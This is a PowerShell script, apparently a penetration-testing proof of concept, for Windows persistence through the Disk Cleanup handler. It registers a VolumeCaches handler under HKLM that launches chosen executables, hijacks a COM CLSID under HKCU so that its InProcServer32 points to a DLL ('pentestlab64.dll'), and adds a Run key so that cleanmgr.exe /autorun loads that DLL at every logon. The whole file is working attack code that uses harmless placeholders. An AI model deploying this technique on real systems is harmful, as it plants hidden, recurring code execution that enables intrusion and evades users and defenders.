function Add-DiskCleanupHKLM {
    #check admin rights
    $currentPrincipal = New-Object Security.Principal.WindowsPrincipal([Security.Principal.WindowsIdentity]::GetCurrent())
    $isAdmin = $currentPrincipal.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

    if ($isAdmin -eq $false) {
        Write-Output "Administrator permissions needed to continue" 
    }
    else { $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'

    New-Item -Name BadGuy -Value $guid -path HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\
    New-ItemProperty -name 'CleanupString' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\Windows\System32\mspaint.exe'
    New-ItemProperty -name 'PreCleanupString' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\Windows\System32\notepad.exe'
    New-ItemProperty -name 'Files' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value '*.foo'
    New-ItemProperty -name 'Folder' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 'C:\test'
    #New-ItemProperty -name 'Flags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
    #New-ItemProperty -name 'StateFlags' -path 'HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\VolumeCaches\badguy' -value 1 -PropertyType DWORD
    }

}

function Add-DiskCleanupHKCU {
    $guid='{4f53c83a-900f-4ed9-902b-7a59a67747ed}'
    new-item -name $guid -Path 'HKCU:\SOFTWARE\Classes\CLSID\' 
    new-item -name InProcServer32 -Path "HKCU:\SOFTWARE\Classes\CLSID\$guid" -value 'c:\tools\pentestlab64.dll'
    New-ItemProperty -name 'ThreadingModel' -path "HKCU:\SOFTWARE\Classes\CLSID/$guid/InProcServer32" -value 'Apartment'
}

function Configure-Persistence {
    New-ItemProperty -name CleanManager -path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -value "cleanmgr.exe /autorun" 

}

function Enable-Persistence {
    Add-DiskCleanupHKCU
    Add-DiskCleanupHKLM
    Configure-Persistence
}
